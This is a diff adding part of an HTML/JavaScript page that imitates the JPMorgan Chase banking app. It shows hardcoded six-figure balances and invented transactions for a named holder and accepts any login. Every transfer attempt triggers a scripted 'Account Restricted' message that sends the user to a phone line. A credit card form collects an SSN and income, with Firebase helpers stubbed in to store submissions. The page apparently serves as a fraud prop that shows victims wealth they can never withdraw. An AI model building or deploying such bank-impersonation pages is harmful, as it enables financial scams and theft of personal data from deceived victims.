+                            <span style="color: var(--text-gray);">SSN</span>
+                            <span style="font-weight: 600;" id="reviewSSN">***-**-5666</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                            <span style="color: var(--text-gray);">Annual Income</span>
+                            <span style="font-weight: 600;" id="reviewIncome">$223,333</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="color: var(--text-gray);">Employment</span>
+                            <span style="font-weight: 600;" id="reviewEmployment">Unemployed</span>
+                        </div>
+                    </div>
+                    
+                    <div style="background: var(--chase-light); border-radius: 12px; padding: 15px; margin-bottom: 20px;">
+                        <p style="font-weight: 600; margin-bottom: 10px; font-size: 14px;">What happens next?</p>
+                        <ul style="font-size: 13px; color: var(--text-gray); padding-left: 18px; line-height: 1.8;">
+                            <li>We'll perform a soft credit check</li>
+                            <li>Review typically takes 1-2 business days</li>
+                            <li>You'll receive a notification once approved</li>
+                        </ul>
+                    </div>
+                    
+                    <div style="display: flex; gap: 10px;">
+                        <button class="btn-primary" style="flex: 1; background: white; color: var(--text-dark); border: 1px solid var(--border-gray);" onclick="goToCardStep2()">Back</button>
+                        <button class="btn-primary" style="flex: 1;" onclick="submitCardApplication()">Submit Application</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Toast -->
+        <div class="toast" id="toast">
+            <span>✓</span>
+            <span id="toastMessage">Welcome back!</span>
+        </div>
+
+        <!-- Custom Keyboard -->
+        <div class="keyboard" id="customKeyboard">
+            <div class="keyboard-row">
+                <button class="key" onclick="pressKey('1')">1</button>
+                <button class="key" onclick="pressKey('2')">2</button>
+                <button class="key" onclick="pressKey('3')">3</button>
+                <button class="key" onclick="pressKey('4')">4</button>
+                <button class="key" onclick="pressKey('5')">5</button>
+                <button class="key" onclick="pressKey('6')">6</button>
+                <button class="key" onclick="pressKey('7')">7</button>
+                <button class="key" onclick="pressKey('8')">8</button>
+                <button class="key" onclick="pressKey('9')">9</button>
+                <button class="key" onclick="pressKey('0')">0</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="key wide" onclick="pressKey('@')">@</button>
+                <button class="key" onclick="pressKey('#')">#</button>
+                <button class="key" onclick="pressKey('$')">$</button>
+                <button class="key" onclick="pressKey('%')">%</button>
+                <button class="key" onclick="pressKey('&')">&</button>
+                <button class="key" onclick="pressKey('*')">*</button>
+                <button class="key" onclick="pressKey('(')">(</button>
+                <button class="key" onclick="pressKey(')')">)</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="key" style="background: #acb4bf;" onclick="hideKeyboard()">↓</button>
+                <button class="key space" onclick="pressKey(' ')">space</button>
+                <button class="key" style="background: #acb4bf;" onclick="backspaceKey()">⌫</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase Configuration - Replace with your config
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+
+        // Initialize Firebase (commented out until config is provided)
+        // firebase.initializeApp(firebaseConfig);
+        // const auth = firebase.auth();
+        // const db = firebase.firestore();
+
+        // App State
+        let currentUser = {
+            name: 'Emmanuel Jobs',
+            email: 'kruegerchelsea1044@mail.com',
+            checkingBalance: 580956.00,
+            savingsBalance: 467778.00,
+            accountsRestricted: true
+        };
+
+        let selectedCard = 'reserve';
+        let activeInput = null;
+        let cardApplications = [];
+
+        // Sample Transactions Data
+        const transactions = [
+            { name: 'Payment from Wal...', date: 'Jan 3, 2026 • 11:23 AM', amount: 191.63, type: 'credit', balance: 580956.00 },
+            { name: 'Purchase at Apple', date: 'Jan 3, 2026 • 11:23 AM', amount: -205.13, type: 'debit', balance: 580942.50 },
+            { name: 'Payment from Wal...', date: 'Jan 3, 2026 • 11:23 AM', amount: 144.38, type: 'credit', balance: 581147.63 },
+            { name: 'Purchase at Post...', date: 'Jan 3, 2026 • 11:23 AM', amount: -144.38, type: 'debit', balance: 581003.25 },
+            { name: 'Payment from Goo...', date: 'Jan 3, 2026 • 11:23 AM', amount: 108.85, type: 'credit', balance: 581112.10 },
+            { name: 'Purchase at Uber', date: 'Jan 3, 2026 • 11:23 AM', amount: -12.57, type: 'debit', balance: 581099.53 },
+            { name: 'Purchase at ATM', date: 'Jan 3, 2026 • 11:23 AM', amount: -140.73, type: 'debit', balance: 580958.80 },
+            { name: 'Payment from Pos...', date: 'Jan 3, 2026 • 11:23 AM', amount: 16.31, type: 'credit', balance: 580975.11 },
+            { name: 'Purchase at Target', date: 'Jan 3, 2026 • 11:23 AM', amount: -104.07, type: 'debit', balance: 580871.04 },
+            { name: 'Purchase at Uber', date: 'Jan 3, 2026 • 11:23 AM', amount: -119.66, type: 'debit', balance: 580751.38 },
+            { name: 'Purchase at Starb...', date: 'Jan 3, 2026 • 11:23 AM', amount: -51.33, type: 'debit', balance: 580700.05 },
+            { name: 'Purchase at Netflix', date: 'Jan 3, 2026 • 11:23 AM', amount: -204.47, type: 'debit', balance: 580495.58 },
+            { name: 'Payment from Tar...', date: 'Jan 3, 2026 • 11:23 AM', amount: 16.07, type: 'credit', balance: 580511.65 },
+            { name: 'Purchase at eBay', date: 'Jan 3, 2026 • 11:23 AM', amount: -209.33, type: 'debit', balance: 580302.32 },
+            { name: 'Payment from AT...', date: 'Jan 3, 2026 • 11:23 AM', amount: 104.88, type: 'credit', balance: 580407.20 },
+            { name: 'Purchase at Post...', date: 'Jan 3, 2026 • 11:23 AM', amount: -197.38, type: 'debit', balance: 580209.82 },
+            { name: 'Payment from Cha...', date: 'Jan 3, 2026 • 11:23 AM', amount: 190.49, type: 'credit', balance: 580400.31 },
+            { name: 'Purchase at ATM', date: 'Jan 3, 2026 • 11:23 AM', amount: -120.26, type: 'debit', balance: 580280.05 },
+            { name: 'Purchase at Starb...', date: 'Jan 3, 2026 • 11:23 AM', amount: -148.82, type: 'debit', balance: 580131.23 },
+            { name: 'Purchase at Direc...', date: 'Jan 3, 2026 • 11:23 AM', amount: -53.70, type: 'debit', balance: 580077.53 },
+            { name: 'Payment from Cha...', date: 'Jan 3, 2026 • 11:23 AM', amount: 37.93, type: 'credit', balance: 580115.46 },
+            { name: 'Purchase at Netflix', date: 'Jan 3, 2026 • 11:23 AM', amount: -95.46, type: 'debit', balance: 580020.00 },
+            { name: 'Payment from Sta...', date: 'Jan 3, 2026 • 11:23 AM', amount: 121.43, type: 'credit', balance: 580141.43 },
+            { name: 'Purchase at eBay', date: 'Jan 3, 2026 • 11:23 AM', amount: -206.54, type: 'debit', balance: 579934.89 },
+            { name: 'Payment from Cha...', date: 'Jan 3, 2026 • 11:23 AM', amount: 74.63, type: 'credit', balance: 580009.52 },
+            { name: 'Purchase at Amaz...', date: 'Jan 3, 2026 • 11:23 AM', amount: -44.25, type: 'debit', balance: 579965.27 },
+            { name: 'Payment from Wal...', date: 'Jan 3, 2026 • 11:23 AM', amount: 202.25, type: 'credit', balance: 580167.52 },
+            { name: 'Purchase at eBay', date: 'Jan 3, 2026 • 11:23 AM', amount: -76.24, type: 'debit', balance: 580091.28 },
+            { name: 'Payment from eBay', date: 'Jan 3, 2026 • 11:23 AM', amount: 155.98, type: 'credit', balance: 580247.26 },
+            { name: 'Purchase at Chase', date: 'Jan 3, 2026 • 11:23 AM', amount: -194.46, type: 'debit', balance: 580052.80 },
+        ];
+
+        // Login Handler
+        function handleLogin() {
+            const btn = document.getElementById('loginBtn');
+            const btnText = document.getElementById('loginBtnText');
+            
+            btn.disabled = true;
+            btnText.innerHTML = '<span class="spinner"></span> Signing in...';
+            
+            setTimeout(() => {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'block';
+                
+                // Show restriction error after brief delay
+                setTimeout(() => {
+                    showRestrictionError();
+                }, 500);
+                
+                showToast('Welcome back!');
+            }, 1500);
+        }
+
+        function togglePassword() {
+            const input = document.getElementById('loginPassword');
+            input.type = input.type === 'password' ? 'text' : 'password';
+        }
+
+        function showRestrictionError() {
+            document.getElementById('errorCode').textContent = 'ERROR CODE: CH04957';
+            document.getElementById('errorTitle').textContent = 'Account Restricted';
+            document.getElementById('errorMessage').innerHTML = 
+                `Dear ${currentUser.name},<br><br>` +
+                `Your account has been temporarily restricted due to unusual activity detected from an unrecognized location. For your security, all outgoing transfers have been suspended. Please contact JPMorgan Chase support via secure message or call <span class="phone-number">1-800-935-9935</span> for immediate assistance.`;
+            document.getElementById('errorModal').classList.add('active');
+        }
+
+        // Navigation
+        function switchTab(tab) {
+            // Update nav items
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+            
+            // Hide all views
+            document.getElementById('accountsView').classList.add('hidden');
+            document.getElementById('transactionsView').classList.add('hidden');
+            document.getElementById('cardsView').classList.add('hidden');
+            document.getElementById('payView').classList.add('hidden');
+            
+            // Show selected view
+            switch(tab) {
+                case 'accounts':
+                    document.getElementById('accountsView').classList.remove('hidden');
+                    break;
+                case 'transactions':
+                    viewTransactions('checking');
+                    break;
+                case 'pay':
+                    document.getElementById('payView').classList.remove('hidden');
+                    openTransferModal();
+                    break;
+                case 'cards':
+                    document.getElementById('cardsView').classList.remove('hidden');
+                    break;
+            }
+        }
+
+        // Transfer Functions
+        function openTransferModal() {
+            document.getElementById('transferModal').classList.add('active');
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+            hideKeyboard();
+        }
+
+        function updateAvailableBalance() {
+            const fromAccount = document.getElementById('fromAccount').value;
+            const balanceEl = document.getElementById('availableBalance');
+            
+            if (fromAccount === 'checking') {
+                balanceEl.textContent = `Available: $${currentUser.checkingBalance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            } else if (fromAccount === 'savings') {
+                balanceEl.textContent = `Available: $${currentUser.savingsBalance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            } else {
+                balanceEl.textContent = '';
+            }
+        }
+
+        function processTransfer() {
+            const fromAccount = document.getElementById('fromAccount').value;
+            const toAccount = document.getElementById('toAccount').value;
+            const amount = parseFloat(document.getElementById('transferAmount').value);
+            
+            if (!fromAccount || !toAccount || !amount) {
+                showToast('Please fill in all fields');
+                return;
+            }
+            
+            const btn = document.getElementById('transferBtn');
+            const btnText = document.getElementById('transferBtnText');
+            
+            btn.disabled = true;
+            btnText.innerHTML = '<span class="spinner"></span> Processing Transfer...';
+            
+            setTimeout(() => {
+                btn.disabled = false;
+                btnText.textContent = 'Transfer →';
+                
+                // Show restriction error
+                document.getElementById('errorCode').textContent = 'ERROR CODE: TXN-RESTRICTED-001';
+                document.getElementById('errorTitle').textContent = 'Transfer Restricted';
+                document.getElementById('errorMessage').innerHTML = 
+                    `Dear ${currentUser.name},<br><br>` +
+                    `Your account has been temporarily restricted due to unusual activity detected from an unrecognized location. For your security, all outgoing transfers have been suspended. Please contact JPMorgan Chase support via secure message or call <span class="phone-number">1-800-935-9935</span> for immediate assistance.<br><br>` +
+                    `For immediate assistance, call: <span class="phone-number">1-800-935-9935</span>`;
+                
+                closeModal('transferModal');
+                setTimeout(() => {
+                    document.getElementById('errorModal').classList.add('active');
+                }, 300);
+            }, 2000);
+        }
+
+        // Transactions
+        function viewTransactions(accountType) {
+            document.getElementById('accountsView').classList.add('hidden');
+            document.getElementById('transactionsView').classList.remove('hidden');
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            document.querySelectorAll('.nav-item')[2].classList.add('active');
+            
+            const accountNames = {
+                checking: { name: 'TOTAL CHECKING', number: '** 7540', balance: currentUser.checkingBalance },
+                savings: { name: 'CHASE SAVINGS', number: '** 8745', balance: currentUser.savingsBalance }
+            };
+            
+            const info = accountNames[accountType];
+            document.getElementById('transAccountName').textContent = info.name;
+            document.getElementById('transAccountNumber').textContent = info.number;
+            document.getElementById('transBalance').textContent = `$${info.balance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            
+            renderTransactions();
+        }
+
+        function renderTransactions() {
+            const list = document.getElementById('transactionsList');
+            list.innerHTML = transactions.map(t => `
+                <div class="transaction-item">
+                    <div class="transaction-info">
+                        <div class="transaction-name">${t.name}</div>
+                        <div class="transaction-date">${t.date}</div>
+                    </div>
+                    <div class="transaction-amount ${t.type}">
+                        <div>${t.type === 'credit' ? '+' : ''}$${Math.abs(t.amount).toFixed(2)}</div>
+                        <div class="transaction-balance">Bal: $${t.balance.toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Card Application
+        function openCardApplication() {
+            document.getElementById('cardModal').classList.add('active');
+            goToCardStep1();
+        }
+
+        function goToCardStep1() {
+            document.getElementById('cardStep1').classList.remove('hidden');
+            document.getElementById('cardStep2').classList.add('hidden');
+            document.getElementById('cardStep3').classList.add('hidden');
+            document.getElementById('cardModalTitle').textContent = 'Credit Card Application';
+        }
+
+        function selectCard(card, fee) {
+            selectedCard = card;
+            document.querySelectorAll('.card-option').forEach(el => el.classList.remove('selected'));
+            event.currentTarget.classList.add('selected');
+        }
+
+        function goToCardStep2() {
+            document.getElementById('cardStep1').classList.add('hidden');
+            document.getElementById('cardStep2').classList.remove('hidden');
+            document.getElementById('cardStep3').classList.add('hidden');
+        }
+
+        function goToCardStep3() {
+            const ssn = document.getElementById('ssnInput').value;
+            
+            if (ssn.length !== 9) {
+                showToast('Please enter a valid 9-digit SSN');
+                // Still allow proceeding for demo
+            }
+            
+            const cardNames = {
+                'preferred': 'Chase Sapphire Preferred®',
+                'reserve': 'Chase Sapphire Reserve®',
+                'freedom-unlimited': 'Chase Freedom Unlimited®',
+                'freedom-flex': 'Chase Freedom Flex℠'
+            };
+            
+            document.getElementById('reviewCardType').textContent = cardNames[selectedCard];
+            document.getElementById('reviewSSN').textContent = `***-**-${ssn.slice(-4) || '5666'}`;
+            document.getElementById('reviewIncome').textContent = `$${parseInt(document.getElementById('incomeInput').value || 0).toLocaleString()}`;
+            document.getElementById('reviewEmployment').textContent = document.getElementById('employmentStatus').value || 'Unemployed';
+            
+            document.getElementById('cardStep2').classList.add('hidden');
+            document.getElementById('cardStep3').classList.remove('hidden');
+        }
+
+        function submitCardApplication() {
+            const application = {
+                cardType: selectedCard,
+                cardName: document.getElementById('reviewCardType').textContent,
+                date: new Date().toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: 'numeric' }),
+                status: 'Under Review'
+            };
+            
+            cardApplications.push(application);
+            
+            closeModal('cardModal');
+            showToast('Application submitted successfully');
+            
+            // Update cards view
+            document.getElementById('noCardsState').classList.add('hidden');
+            document.getElementById('applicationsList').classList.remove('hidden');
+            
+            document.getElementById('applicationsList').innerHTML = `
+                <h4 style="margin-bottom: 15px; color: var(--text-gray); font-size: 14px;">Applications</h4>
+                ${cardApplications.map(app => `
+                    <div class="application-status">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <div>
+                                <div style="font-weight: 600; margin-bottom: 4px;">${app.cardName}</div>
+                                <div style="font-size: 13px; color: var(--text-gray);">Applied ${app.date}</div>
+                            </div>
+                            <span class="status-badge under-review">${app.status}</span>
+                        </div>
+                    </div>
+                `).join('')}
+            `;
+            
+            // Switch to cards tab
+            switchTab('cards');
+        }
+
+        // Keyboard
+        function showKeyboard() {
+            activeInput = document.activeElement;
+            document.getElementById('customKeyboard').classList.add('active');
+        }
+
+        function hideKeyboard() {
+            document.getElementById('customKeyboard').classList.remove('active');
+            activeInput = null;
+        }
+
+        function pressKey(key) {
+            if (activeInput) {
+                activeInput.value += key;
+                activeInput.dispatchEvent(new Event('input'));
+            }
+        }
+
+        function backspaceKey() {
+            if (activeInput && activeInput.value.length > 0) {
+                activeInput.value = activeInput.value.slice(0, -1);
+                activeInput.dispatchEvent(new Event('input'));
+            }
+        }
+
+        // Toast
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMessage').textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function showErrorModal(message) {
+            document.getElementById('errorCode').textContent = '';
+            document.getElementById('errorTitle').textContent = 'Feature Unavailable';
+            document.getElementById('errorMessage').innerHTML = message;
+            document.getElementById('errorModal').classList.add('active');
+        }
+
+        // Close modals on outside click
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.classList.remove('active');
+                }
+            });
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Check for saved session
+            const savedSession = localStorage.getItem('chaseSession');
+            if (savedSession) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'block';
+            }
+        });
+
+        // Save session on login
+        function saveSession() {
+            localStorage.setItem('chaseSession', JSON.stringify(currentUser));
+        }
+
+        // Firebase integration helpers (for when you add your config)
+        async function signInWithFirebase(email, password) {
+            try {
+                const userCredential = await auth.signInWithEmailAndPassword(email, password);
+                const user = userCredential.user;
+                
+                // Fetch user data from Firestore
+                const userDoc = await db.collection('users').doc(user.uid).get();
+                if (userDoc.exists) {
+                    currentUser = { ...currentUser, ...userDoc.data() };
+                    updateUI();
+                }
+                
+                return user;
+            } catch (error) {
+                showToast(error.message);
+                throw error;
+            }
+        }
+
+        async function saveTransferToFirebase(transferData) {
+            try {
+                await db.collection('transfers').add({
+                    ...transferData,
+                    userId: auth.currentUser.uid,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                });
+            } catch (error) {
+                console.error('Error saving transfer:', error);
+            }
+        }
+
+        async function saveCardApplicationToFirebase(applicationData) {
+            try {
+                await db.collection('cardApplications').add({
+                    ...applicationData,
+                    userId: auth.currentUser.uid,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    status: 'pending'
+                });
+            } catch (error) {
+                console.error('Error saving application:', error);
+            }
+        }
+
+        function updateUI() {
+            document.getElementById('userName').textContent = currentUser.name;
+            document.getElementById('checkingBalance').textContent = 
+                `$${currentUser.checkingBalance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            document.getElementById('savingsBalance').textContent = 
+                `$${currentUser.savingsBalance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+        }
+    </script>
+</body>
+</html>
